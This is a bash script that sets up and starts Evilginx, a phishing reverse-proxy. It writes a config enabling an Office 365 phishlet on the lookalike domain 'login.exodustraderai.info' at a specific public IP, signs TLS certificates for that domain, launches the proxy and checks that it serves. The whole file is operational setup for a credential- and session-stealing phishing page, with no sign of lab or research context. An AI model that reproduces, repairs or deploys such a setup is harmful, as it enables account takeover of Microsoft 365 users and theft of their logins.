#!/bin/bash
set -e

echo "=========================================="
echo "COMPLETE EVILGINX FIX - NO MORE BULLSHIT"
echo "=========================================="

# Kill any running Evilginx
screen -S evilginx -X quit 2>/dev/null || true
sleep 3

# Remove old config and create fresh one with CORRECT settings
echo "Creating proper config.json..."
cat > /root/.evilginx/config.json << 'CONFIGEOF'
{
  "blacklist": {
    "mode": "noadd"
  },
  "general": {
    "autocert": false,
    "bind_ipv4": "",
    "dns_port": 53,
    "domain": "login.exodustraderai.info",
    "external_ipv4": "34.27.201.198",
    "https_port": 8443,
    "ipv4": "",
    "unauth_url": ""
  },
  "phishlets": {
    "O365": {
      "enabled": true,
      "hostname": "login.exodustraderai.info"
    }
  }
}
CONFIGEOF

echo "Config created!"
echo ""
cat /root/.evilginx/config.json
echo ""

# Generate certificates manually in sites directory
echo "Generating SSL certificates..."
mkdir -p /root/.evilginx/crt/sites/login.exodustraderai.info

cd /tmp
openssl genrsa -out privkey.pem 2048 2>/dev/null

openssl req -new -key privkey.pem -out cert.csr \
  -subj "/C=US/ST=State/L=City/O=Org/CN=login.exodustraderai.info" 2>/dev/null

openssl x509 -req -in cert.csr \
  -CA /root/.evilginx/crt/ca.crt \
  -CAkey /root/.evilginx/crt/ca.key \
  -CAcreateserial -out fullchain.pem \
  -days 365 -sha256 2>/dev/null

cp fullchain.pem /root/.evilginx/crt/sites/login.exodustraderai.info/
cp privkey.pem /root/.evilginx/crt/sites/login.exodustraderai.info/

echo "Certificates created:"
ls -la /root/.evilginx/crt/sites/login.exodustraderai.info/
echo ""

# Start Evilginx with JUST -developer flag
echo "Starting Evilginx..."
cd /opt/evilginx
screen -dmS evilginx bash -c "./evilginx -developer"

sleep 8

echo ""
echo "Checking Evilginx screen session..."
screen -ls | grep evilginx || echo "ERROR: Screen session not found!"
echo ""

echo "Checking if port 8443 is listening..."
netstat -tlnp | grep 8443 || echo "ERROR: Port 8443 not listening!"
echo ""

echo "Testing SSL connection..."
timeout 5 openssl s_client -connect 127.0.0.1:8443 -servername login.exodustraderai.info < /dev/null 2>&1 | head -20
echo ""

echo "Testing with curl..."
timeout 10 curl -k -H "Host: login.exodustraderai.info" https://127.0.0.1:8443/ 2>&1 | head -30

echo ""
echo "=========================================="
echo "FIX COMPLETE!"
echo "=========================================="
